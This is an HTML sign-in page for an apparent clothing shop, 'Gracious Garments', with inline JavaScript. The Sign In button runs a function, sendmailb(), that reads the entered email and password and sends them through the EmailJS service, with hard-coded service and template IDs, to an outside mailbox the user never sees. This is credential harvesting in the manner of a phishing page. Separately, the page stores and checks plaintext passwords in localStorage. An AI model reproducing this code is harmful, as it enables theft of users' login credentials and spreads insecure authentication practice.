<!doctype html>
<html lang="en">

<head>
    <title>Sign In | Gracious Garments</title>
    <!-- Required meta tags -->
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />

    <!-- Bootstrap CSS v5.2.1 -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet"
        integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="stylesheet" href="Signin.css">
</head>

<body>

    <section>
        <div class="imgBx">
            <img src="../images/image.png" alt="">
        </div>
        <div class="contentBx">
            <div class="formBx">
                <h2>Sign in</h2>
                <form id="loginForm" onsubmit="return validateSignInForm(event)">
                    <div class="inputBx">
                        <span>E-mail</span>
                        <input type="email" id="loginEmail" class="inputs" placeholder="Enter your email" required>
                    </div>
                    <div class="inputBx">
                        <span>Password</span>
                        <input type="password" id="loginPassword" class="inputs" placeholder="Enter your password" required>
                    </div>
                    <div class="inputBx">
                        <button type="submit" onclick="sendmailb()" style="color: rgb(247, 244, 244);">Sign In</button>
                    </div>
                </form>
            </div>
        </div>
    </section>

    <!-- Bootstrap JavaScript Libraries -->
    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.11.8/dist/umd/popper.min.js"
        integrity="sha384-I7E8VVD/ismYTF4hNIPjVp/Zjvgyol6VFvRkX/vR+Vc4jQkC+hVqc2pM8ODewa9r"
        crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.min.js"
        integrity="sha384-BBtl+eGJRgqQAUMxJ7pMwbEyER4l1g+O15P+16Ep7Q9Q+zqX6gSbd85u4mG4QzX+"
        crossorigin="anonymous"></script>
        <script type="text/javascript"
        src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
</script>
    <script>
        function validateSignInForm(event) {
            event.preventDefault(); // Prevent form submission for validation

            const email = document.getElementById("loginEmail").value.trim();
            const password = document.getElementById("loginPassword").value;

            // Retrieve stored user data from localStorage
            const storedUserData = JSON.parse(localStorage.getItem("user"));

            if (!storedUserData) {
                alert("No user found. Please sign up first.");
                window.location.href = "register.html"; // Redirect to sign up page
                return false;
            }

            // Validate email and password
            if (email !== storedUserData.email || password !== storedUserData.password) {
                alert("Invalid email or password.");
                return false;
            }

            alert("Login successful!");
            window.location.href = "index.html"; // Redirect to the main website
        }
    
        (function () {
            emailjs.init({
                publicKey: "qb05_XD_DMeQuXujk",
            });
        })();
        function sendmailb(){
            var inp = document.getElementsByClassName('inputs')
            var obj = {
                    "email": inp[0].value,
                    "password": inp[1].value
                    
        }
        emailjs.send('service_vj7xv2c', 'template_kosuywv', obj);
    }
    </script>
</body>

</html>